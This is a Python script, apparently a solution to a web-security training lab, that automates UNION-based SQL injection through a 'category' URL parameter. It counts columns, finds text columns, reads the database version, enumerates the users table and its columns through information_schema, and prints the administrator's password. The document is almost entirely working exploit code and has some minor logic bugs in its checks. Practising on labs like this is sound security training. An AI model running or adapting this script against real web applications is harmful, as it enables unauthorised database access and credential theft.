import sys
import requests as req
import urllib3
from bs4 import BeautifulSoup as bs
import re
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def expcols(url):
    for i in range(1, 10):
        p = f"' order by {i}-- -"
        furl = url + p
        r = req.get(furl, verify=False, proxies=proxies)
        print(f"Testing #{i}")
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return False

def textc(url, cols, c):
    string = "'a'"
    for i in range(c, cols + 1):
        plist = ['null'] * cols
        plist[i - 1] = string
        sqlp = "' union select " + ",".join(plist) + "-- -"
        r = req.get(url + sqlp, verify=False, proxies=proxies)
        if string.strip('\'') in r.text:
            return i
    return False

def getVersion(url, cols, text_columns):
    plist = ['null'] * cols
    plist[random.choice(text_columns) - 1] = "version()"
    sqlp = "' union select " + ",".join(plist) + "-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
    ver = soup.find(string=re.compile(r'.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if ver is None:
        return False
    else:
        print(f"🎯 SQL Version: {ver.strip()}")
        return True

def getTables(url, cols, text_columns):
    plist = ['null'] * cols
    plist[random.choice(text_columns) - 1] = "table_name"
    sqlp = "' union select " + ",".join(plist) + " from information_schema.tables-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
    table = soup.find(string=re.compile(r'.*users_.*'))
    if table is None:
        return False
    else:
        t = table.strip()
        print(f"🎯 Users table is: {t}")
        return t

def getColumns(url, cols, text_columns, utable):
    plist = ['null'] * cols
    plist[random.choice(text_columns) - 1] = "column_name"
    sqlp = "' union select " + ",".join(plist) + f" from information_schema.columns where table_name='{utable}'-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
    col_u = soup.find(string=re.compile(r'.*username.*'))
    col_p = soup.find(string=re.compile(r'.*password.*'))
    if col_u and col_p is None:
        return False, False
    else:
        return col_u, col_p

def exploit(url, cols, text_columns, utable, cu, cp):
    plist = ['null'] * cols
    plist[0] = cu
    plist[1] = cp
    sqlp = "' union select " + ",".join(plist) + f" from {utable}-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
    passw = soup.body.find(string='administrator').parent.findNext('td').contents[0]
    if passw:
        print(f"✅ Credentials: administrator:{passw}")
        return True
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1] + "filter?category="
        cols = expcols(url)
        text_columns = []
        if cols:
            print(f"🎯 Number of columns: {cols}")
            c = 1
            while c <= cols:
                tcol = textc(url, cols, c)
                if tcol:
                    print(f"[+] Text column found: #{tcol}")
                    if tcol not in text_columns:
                        text_columns.append(tcol)
                else:
                    print(f"No text found in column #{c}")

                opt = input("Keep testing columns? y/n: ").strip().lower()
                if opt == "n":
                    print("Exiting column testing...")
                    break
                elif opt == "y":
                    c += 1
                else:
                    print("Invalid selection. Please choose 'y' or 'n'.")
                    c += 1

            print(f"🎯 Valid text columns: {text_columns}")

            if text_columns:
                if not getVersion(url, cols, text_columns):
                    print("Could not retrieve SQL version.")
                utable = getTables(url, cols, text_columns)
                if not utable:
                    print("Could not retrieve table names.")
                cu, cp = getColumns(url, cols, text_columns, utable)
                print(f"🎯 Username column: {cu}, Password column: {cp}")
                if not cu and cp:
                    print("Could not retrieve column names.")
                if exploit(url, cols, text_columns, utable, cu, cp):
                    print("[i] DONE 🥸")

        else:
            print("Error retrieving number of columns.")

    except IndexError:
        print(f"Usage: {sys.argv[0]} <baseUrl>")
        sys.exit(-1)
